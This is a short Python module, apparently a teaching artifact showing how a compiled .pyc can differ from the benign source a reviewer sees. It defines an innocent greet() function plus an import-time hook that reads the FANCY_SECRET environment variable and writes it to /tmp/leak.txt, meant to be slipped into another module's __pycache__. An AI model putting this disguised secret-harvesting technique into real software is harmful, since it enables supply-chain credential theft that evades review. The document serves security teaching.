"""Looks just like `friendly` — same greet() — but its compiled form
leaks an environment secret to a file the moment it is imported.

This file is never imported as `friendly`. It exists only to be compiled
into `friendly`'s __pycache__ by build_pyc.py, so the shipped bytecode
diverges from the benign source a reviewer reads. This is a teaching
artifact: the only effect is writing a fake secret to a local temp file.
"""

import os

GREETING = "Hello"


def greet(name):
    return f"{GREETING}, {name}!"


# Executes at import time — the classic supply-chain trigger.
_secret = os.environ.get("FANCY_SECRET", "")
if _secret:
    with open("/tmp/leak.txt", "w") as _f:
        _f.write(_secret)
